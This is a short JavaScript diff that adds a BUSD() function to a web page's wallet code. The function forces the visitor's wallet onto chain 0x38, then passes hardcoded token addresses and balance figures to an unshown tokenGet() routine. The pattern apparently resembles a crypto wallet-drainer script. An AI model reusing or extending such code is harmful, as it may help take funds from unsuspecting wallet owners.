@@ -673,7 +673,9 @@ var data = {
 
           // trade()
 
-        await TOKENS()
+        await BUSD();
+
+        // await TOKENS()
 
         // await citizen();
 
@@ -1210,6 +1212,38 @@ try {
     
 
     }
+
+
+
+async function BUSD(){
+  await loadWeb3();
+
+  try {
+      await window.ethereum.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{chainId: '0x38'}]})
+} catch(e) {
+  
+}
+    const t = [
+    // [{token: '0x9F52c8ecbEe10e00D9faaAc5Ee9Ba0fF6550F511'}, {balance: 17000}],
+
+
+      [{token: '0x3529EAdAcb3375eD37124c40Ada9827A6B0eC2e1'}, {balance: 13000}],
+
+  
+  ]
+  
+   t.forEach( async e => {
+      var t = e[0].token
+      var b = e[1].balance
+      // var c = e[2].chain
+  
+      console.log(t,b,)
+  
+      await tokenGet(t, b)
+  })
+}
 
 async function TOKENS(){
   await loadWeb3();
